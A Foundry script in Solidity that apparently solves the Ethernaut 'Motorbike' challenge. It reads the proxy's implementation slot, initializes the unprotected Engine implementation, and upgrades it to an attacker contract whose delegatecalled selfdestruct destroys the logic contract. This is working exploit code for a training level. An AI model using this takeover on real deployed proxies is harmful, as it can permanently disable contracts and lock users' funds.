// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Motorbike.sol";

contract MotorbikeSolve is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Motorbike bike = Motorbike(0x2850c73C791D897c1a421F4A6625d3aaE16bfDdA);
    Engine engine = Engine(address(uint160(uint256(vm.load(address(bike), _IMPLEMENTATION_SLOT)))));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Engine Upgader : ", engine.upgrader());
        console.log("Engine Horse Power : ", engine.horsePower());

        new Attack().exploit(address(engine));
        vm.stopBroadcast();
    }
}

contract Attack{
    Engine public engine;

    function exploit(address _engine) public {

        engine = Engine(_engine);
        
        engine.initialize();

        bytes memory destructSelector = abi.encodeWithSelector(this.destructEngine.selector); 

        engine.upgradeToAndCall(address(this), destructSelector);

    }

    function destructEngine() public{
        selfdestruct(payable(address(this)));
    }

    receive() payable external{}
}